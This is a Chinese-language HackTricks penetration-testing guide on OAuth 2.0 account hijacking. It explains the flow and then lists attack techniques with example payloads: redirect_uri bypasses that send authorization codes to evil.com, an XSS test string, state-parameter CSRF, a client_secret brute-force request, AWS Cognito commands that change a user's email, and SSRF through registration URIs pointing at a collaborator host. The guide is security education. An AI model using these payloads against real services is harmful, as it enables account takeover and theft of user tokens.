# OAuth账号劫持

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 基本信息 <a href="#d4a8" id="d4a8"></a>

OAuth有几个不同的版本，你可以阅读[https://oauth.net/2/](https://oauth.net/2/)来了解基本概念。

在本文中，我们将重点介绍你今天可能遇到的最常见的流程，即[OAuth 2.0授权码授权类型](https://oauth.net/2/grant-types/authorization-code/)。简而言之，OAuth为开发人员提供了一种**授权机制，允许应用程序从另一个应用程序（授权服务器）访问数据或执行某些操作**。

例如，假设网站_**https://yourtweetreader.com**_具有显示你发送的所有推文（包括私人推文）的功能。为了实现这一点，引入了OAuth 2.0。_https://yourtweetreader.com_将要求你**授权他们的Twitter应用程序访问你的所有推文**。在_https://twitter.com_上会弹出一个同意页面，显示正在请求的**权限以及请求权限的开发人员**。一旦你授权请求，_https://yourtweetreader.com_将能够**代表你访问你的推文**。

在OAuth 2.0上下文中重要的理解元素有：

* **资源所有者**：`资源所有者`是授予对其受保护资源（例如Twitter帐户推文）访问权限的**用户/实体**。在这个例子中，这将是**你**。
* **资源服务器**：`资源服务器`是在应用程序代表`资源所有者`获得`访问令牌`后处理经过身份验证的请求的**服务器**。在这个例子中，这将是**https://twitter.com**。
* **客户端应用程序**：`客户端应用程序`是从`资源所有者`请求授权的**应用程序**。在这个例子中，这将是**https://yourtweetreader.com**。
* **授权服务器**：`授权服务器`是在成功验证`资源所有者`并获得授权后向`客户端应用程序`**发放`访问令牌`**的**服务器**。在上面的例子中，这将是**https://twitter.com**。
* **client\_id**：`client_id`是应用程序的**标识符**。这是一个公开的、**非机密**的唯一标识符。
* **client\_secret**：`client_secret`是应用程序和授权服务器之间**唯一已知的机密**。它用于生成`access_token`。
* **response\_type**：`response_type`是一个值，用于详细说明正在请求的**令牌类型**，例如`code`。
* **scope**：`scope`是`客户端应用程序`从`资源所有者`请求的**访问级别**。
* **redirect\_uri**：`redirect_uri`是**授权完成后用户被重定向到的URL**。这通常必须与您之前在服务中注册的重定向URL匹配。
* **state**：`state`参数可以在用户被重定向到授权服务器和返回之间**持久化数据**。这是一个唯一值非常重要，因为它作为**CSRF保护机制**，如果它包含每个请求的唯一或随机值。
* **grant\_type**：`grant_type`参数解释了**授权类型是什么**，以及将返回哪个令牌。
* **code**：这个`code`是从`授权服务器`接收到的授权码，将在此请求的查询字符串参数“code”中。
* **access\_token**：`access_token`是`客户端应用程序`用于代表`资源所有者`进行API请求的**令牌**。
* **refresh\_token**：`refresh_token`允许应用程序**在不提示用户的情况下获取新的`access_token`**。

### 真实示例

将所有这些内容结合起来，下面是一个**真实的OAuth流程示例**：

1. 你访问[https://yourtweetreader.com](https://yourtweetreader.com)并点击“与Twitter集成”按钮。
2. [https://yourtweetreader.com](https://yourtweetreader.com)向[https://twitter.com](https://twitter.com)发送一个请求，要求你作为资源所有者授权https://yourtweetreader.com的Twitter应用程序访问你的推文。请求将如下所示：
```
https://twitter.com/auth
?response_type=code
&client_id=yourtweetreader_clientId
&redirect_uri=https%3A%2F%2Fyourtweetreader.com%2Fcallback
&scope=readTweets
&state=kasodk9d1jd992k9klaskdh123
```
3\. 你将会看到一个同意页面：

![](https://miro.medium.com/max/1215/1\*y66EY3Fn2qn-NPI9nhZC7A.png)

4\. 一旦同意，Twitter将会通过`redirect_uri`将`code`和`state`参数发送回来：
```
https://yourtweetreader.com?code=asd91j3jd91j92j1j9d1&state=kasodk9d1jd992k9klaskdh123
```
5\. [https://yourtweetreader.com](https://yourtweetreader.com) 然后会使用他们应用的 `client_id` 和 `client_secret`，通过向服务器发送请求来获取一个代表你的 `access_token`，从而允许他们访问你所同意的权限：
```
POST /oauth/access_token
Host: twitter.com
...{"client_id": "yourtweetreader_clientId", "client_secret": "yourtweetreader_clientSecret", "code": "asd91j3jd91j92j1j9d1", "grant_type": "authorization_code"}
```
6\. 最后，流程完成后，[https://yourtweetreader.com](https://yourtweetreader.com) 将使用你的 `access_token` 向 Twitter 发送 API 调用以访问你的推文。

## 漏洞赏金发现 <a href="#323a" id="323a"></a>

现在，有趣的部分来了！在 OAuth 实现中可能出现许多问题，以下是我经常看到的不同类型的漏洞：

### 弱的 redirect\_uri 配置 <a href="#cc36" id="cc36"></a>

`redirect_uri` 非常重要，因为在授权后，**敏感数据（如 `code`）会附加到此 URL** 上。如果 `redirect_uri` 可以被重定向到一个**攻击者控制的服务器**，这意味着攻击者有可能通过使用 `code` 来**接管受害者的账户**，并获取对受害者数据的访问权限。

这个漏洞的利用方式因授权服务器而异。**有些**服务器**只接受**与客户端应用程序中指定的**`redirect_uri` 路径完全相同**的请求，但有些服务器**接受**与 `redirect_uri` 相同域或子目录中的任何请求**。

根据服务器处理的逻辑，有许多绕过 `redirect_uri` 的技术。在 `redirect_uri` 为 [https://yourtweetreader.com](https://yourtweetreader.com)/callback 的情况下，这些技术包括：

* 开放重定向：[`https://yourtweetreader.com`](https://yourtweetreader.com)`/callback?redirectUrl=https://evil.com`
* 路径遍历：`https://yourtweetreader.com/callback/../redirect?url=https://evil.com`
* 弱 `redirect_uri` 正则表达式：`https://yourtweetreader.com.evil.com`
* 通过 referer 头部进行 HTML 注入和令牌窃取：`https://yourtweetreader.com/callback/home/attackerimg.jpg`

**其他可能受到开放重定向漏洞的参数**包括：

* **client\_uri** - 客户端应用程序的主页 URL
* **policy\_uri** - Relying Party 客户端应用程序提供的 URL，用于让最终用户了解其个人资料数据的使用方式。
* **tos\_uri** - Relying Party 客户端提供的 URL，用于让最终用户了解 Relying Party 的服务条款。
* **initiate\_login\_uri** - 第三方可以使用的使用 https 协议的 URI，用于启动 RP 的登录。也应该用于客户端重定向。

根据 OAuth 和 OpenID 规范，所有这些参数都是**可选的**，并不一定在特定服务器上支持，因此值得确定服务器支持哪些参数。

如果你攻击的是 OpenID 服务器，发现端点中的 \*\*`.well-known/openid-configuration`\*\*有时包含参数，如 "_registration\_endpoint_"、"_request\_uri\_parameter\_supported_" 和 "_require\_request\_uri\_registration_"。这些参数可以帮助你找到注册端点和其他服务器配置值。

### 重定向实现中的 XSS 漏洞 <a href="#bda5" id="bda5"></a>

正如在这个漏洞赏金报告 [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) 中提到的，可能存在将重定向的 **URL 反射到服务器响应** 中的情况，从而**容易受到 XSS 攻击**。测试可能的有效载荷：
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - 处理state参数不当 <a href="#bda5" id="bda5"></a>

很多时候，**`state`参数完全被省略或者被错误使用**。如果`state`参数**不存在**，或者是一个**从不改变的静态值**，那么OAuth流程很可能会**受到CSRF攻击**。有时，即使存在`state`参数，**应用程序可能不会对该参数进行任何验证**，这时攻击仍然有效。利用这种情况，您可以在自己的账户上进行授权过程，并在授权后暂停。然后，您将遇到如下请求：
```
https://yourtweetreader.com?code=asd91j3jd91j92j1j9d1
```
在收到此请求后，您可以**放弃该请求，因为这些代码通常只能使用一次**。然后，您可以将此URL发送给**已登录的用户，它将将您的帐户添加到他们的帐户中**。起初，这可能听起来并不敏感，因为您只是将您的帐户添加到受害者的帐户中。然而，许多OAuth实现是用于登录目的，因此如果您可以添加用于登录的Google帐户，您可能只需单击一次即可执行**帐户接管**，因为使用您的Google帐户登录将使您能够访问受害者的帐户。

您可以在此[**CTF writeup**](https://github.com/gr455/ctf-writeups/blob/master/hacktivity20/notes\_surfer.md)和名为Oouch的**HTB盒子**中找到关于此的**示例**。

我还看到过状态参数多次用作附加重定向值。应用程序将使用`redirect_uri`进行初始重定向，但然后使用`state`参数作为第二个重定向，其中可能包含查询参数或引用头中的`code`。

需要注意的一件重要事情是，这不仅适用于登录和帐户接管类型的情况。我曾经看到过以下配置错误：

* Slack集成允许攻击者将其Slack帐户添加为所有通知/消息的接收者
* Stripe集成允许攻击者覆盖付款信息并接受来自受害者客户的付款
* PayPal集成允许攻击者将其PayPal帐户添加到受害者的帐户中，从而将资金存入攻击者的PayPal帐户

### 帐户接管前 <a href="#ebe4" id="ebe4"></a>

我经常看到的另一个常见问题是应用程序允许“使用X登录”，但也允许用户名/密码登录。有两种不同的攻击方式：

1. 如果应用程序在帐户创建时**不要求电子邮件验证**，请在受害者注册之前尝试使用受害者的电子邮件地址和攻击者密码**创建一个帐户**。如果**受害者**随后尝试使用Google等第三方进行注册或登录，应用程序可能会进行查找，看到电子邮件已经注册，然后**将其Google帐户链接到攻击者创建的帐户**。这是一种“**帐户接管前**”，如果攻击者在受害者注册之前创建了帐户，攻击者将可以访问受害者的帐户。
2. 如果**OAuth应用程序不要求电子邮件验证**，请尝试使用该OAuth应用程序注册，然后将电子邮件地址更改为**受害者的电子邮件地址**。与上述问题相同，但您将从另一个方向进行攻击，并获得对受害者帐户的访问权限，以进行帐户接管。

### 泄露机密信息 <a href="#e177" id="e177"></a>

非常重要的是要识别**许多OAuth参数中的哪些是机密的**，并保护这些参数。例如，泄露`client_id`是完全可以接受和必要的，但泄露**`client_secret`是危险的**。如果泄露了这个参数，**攻击者**可能会滥用受信任客户端应用程序的信任和身份，以窃取用户的`access_tokens`和私人信息/访问其集成帐户**。回到我们之前的例子，我曾经遇到的一个问题是从客户端而不是服务器执行此步骤：

_5._ [_https://yourtweetreader.com_](https://yourtweetreader.com) _将获取到的`code`，并使用他们应用程序的`client_id`和`client_secret`，从服务器发起请求以代表您检索`access_token`，这将允许他们访问您同意的权限。_

**如果从客户端执行此操作，将泄露`client_secret`，用户将能够代表应用程序生成`access_tokens`**。通过一些社会工程，他们还可以**向OAuth授权添加更多范围**，并且所有这些看起来都是合法的，因为请求将来自受信任的客户端应用程序。

### 客户端密钥暴力破解

您可以尝试使用身份提供者对服务提供商的**客户端密钥进行暴力破解**，以尝试窃取帐户。\
BF的请求可能类似于：
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header泄露Code + State

一旦客户端获得了**code和state**，如果在浏览到其他页面时**在Referer头中反射出来**，那么就存在漏洞。

### 存储在浏览器历史记录中的访问令牌

进入**浏览器历史记录并检查访问令牌是否保存在其中**。

### 永久的授权码

**授权码应该只存在一段时间，以限制攻击者窃取和使用的时间窗口**。

### 授权/刷新令牌未绑定到客户端

如果你可以获得**授权码并将其与其他客户端一起使用**，那么你可以接管其他账户。

### 快乐路径，XSS，Iframes和Post Messages泄露code和state值

### AWS Cognito <a href="#bda5" id="bda5"></a>

在这个漏洞赏金报告中：[**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)，你可以看到**AWS Cognito**返回给用户的**令牌**可能具有**足够的权限来覆盖用户数据**。因此，如果你可以将用户的电子邮件更改为其他用户的电子邮件，你可能能够接管其他账户。
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
有关如何滥用AWS Cognito的更详细信息，请查看：

{% embed url="https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum" %}

### 两个链接和cookie <a href="#bda5" id="bda5"></a>

根据[**这篇文章**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，可以让受害者打开一个页面，其中的**returnUrl**指向攻击者的主机。这个信息将会**存储在一个cookie (RU)**中，在**后续步骤**中，**提示框**会**询问**用户是否愿意给予该攻击者的主机访问权限。

为了绕过这个提示框，可以打开一个标签页来启动**Oauth流程**，该流程将使用**returnUrl**设置RU cookie，然后在提示框显示之前关闭该标签页，并打开一个不带该值的新标签页。然后，**提示框不会显示攻击者的主机**，但cookie将被设置为该主机，因此**令牌将被发送到攻击者的主机**进行重定向。

### SSRF参数 <a href="#bda5" id="bda5"></a>

你可能会错过的一个隐藏URL是**动态客户端注册端点**。为了成功验证用户，OAuth服务器需要了解有关客户端应用程序的详细信息，例如"client\_name"、"client\_secret"、"redirect\_uris"等。这些详细信息可以通过本地配置提供，但OAuth授权服务器也可能有一个**特殊的注册端点**。该端点通常映射到"/register"，并接受以下格式的POST请求：
```json
POST /connect/register HTTP/1.1
Content-Type: application/json
Host: server.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...

{
"application_type": "web",
"redirect_uris": ["https://client.example.org/callback"],
"client_name": "My Example",
"logo_uri": "https://client.example.org/logo.png",
"subject_type": "pairwise",
"sector_identifier_uri": "https://example.org/rdrct_uris.json",
"token_endpoint_auth_method": "client_secret_basic",
"jwks_uri": "https://client.example.org/public_keys.jwks",
"contacts": ["ve7jtb@example.org"],
"request_uris": ["https://client.example.org/rf.txt"]
}
```
这个请求中有两个规范定义了参数：[RFC7591](https://tools.ietf.org/html/rfc7591) 是关于 OAuth 的，[Openid Connect Registration 1.0](https://openid.net/specs/openid-connect-registration-1\_0.html#rfc.section.3.1) 是关于 Openid Connect 注册的。

正如你在这里所看到的，一些值通过 URL 引用传递，并且看起来可能是 [服务器端请求伪造](https://portswigger.net/web-security/ssrf) 的潜在目标。与此同时，我们测试过的大多数服务器在接收到注册请求时并不立即解析这些 URL。相反，它们只是**保存这些参数，并在 OAuth 授权流程中稍后使用它们**。换句话说，这更像是一个二次 SSRF，这使得黑盒检测更加困难。

以下参数对于 SSRF 攻击特别有趣：

* **logo\_uri** - 引用客户端应用程序的**标志的 URL**。**在注册客户端之后**，你可以尝试使用你的新的 "client\_id" 调用 OAuth 授权端点（"/authorize"）。在登录后，服务器会要求你批准该请求，并**可能显示来自 "logo\_uri" 的图像**。如果**服务器自己获取图像**，则应该通过此步骤触发 SSRF。或者，服务器可能只是通过**客户端端的 "\<img>" 标签**包含标志。虽然这不会导致 SSRF，但可能会导致 XSS，如果 URL 没有转义的话。
* **jwks\_uri** - 客户端的 JSON Web Key Set \[JWK] 文档的 URL。在使用 JWT 进行客户端身份验证时，服务器需要此密钥集来验证发送到令牌端点的已签名请求 \[RFC7523]。为了测试此参数中的 SSRF，**使用恶意的 "jwks\_uri" 注册一个新的客户端应用程序**，执行授权过程以**获取任何用户的授权码**，然后使用以下请求体获取 "/token" 端点：

`POST /oauth/token HTTP/1.1`\
`...`\
\`\`\
`grant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...`

如果存在漏洞，**服务器应该对提供的 "jwks\_uri" 执行服务器到服务器的 HTTP 请求**，因为它需要此密钥来检查请求中的 "client\_assertion" 参数的有效性。这可能只是一个**盲目的 SSRF 漏洞**，因为服务器期望得到一个正确的 JSON 响应。
* **sector\_identifier\_uri** - 此 URL 引用一个包含单个**重定向 URL 值的 JSON 数组的文件**。如果支持，服务器可能会在你提交动态注册请求时**立即获取此值**。如果不立即获取，请尝试在服务器上为此客户端执行授权。由于服务器需要知道重定向 URL 来完成授权流程，这将迫使服务器向你恶意的 sector\_identifier\_uri 发出请求。
* **request\_uris** - 这是一个**允许此客户端的请求 URL 数组**。授权端点可能支持 "request\_uri" 参数，以提供包含请求信息的 JWT 的 URL（参见 [https://openid.net/specs/openid-connect-core-1\_0.html#rfc.section.6.2](https://openid.net/specs/openid-connect-core-1\_0.html#rfc.section.6.2)）。

即使动态客户端注册未启用，或者需要身份验证，我们仍然可以尝试在授权端点上执行 SSRF，只需使用 "request\_uri"：\\

`GET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt`

注意：不要将此参数与 "redirect\_uri" 混淆。"redirect\_uri" 用于授权后的重定向，而**"request\_uri" 在授权过程开始时由服务器获取**。

与此同时，我们看到许多服务器不允许任意的 "request\_uri" 值：它们只允许在客户端注册过程中预先注册的白名单 URL。这就是为什么我们需要事先提供 "request\_uris": "https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt"。

## OAuth 提供商的竞争条件

如果你正在测试的平台是一个 OAuth 提供商，[**阅读此内容以测试可能的竞争条件**](race-condition.md)。

## 参考资料

* [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
* [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得最新版本的 PEASS 或下载 PDF 格式的 HackTricks 吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 NFT 收藏品 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass)，或者在 **Twitter** 上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
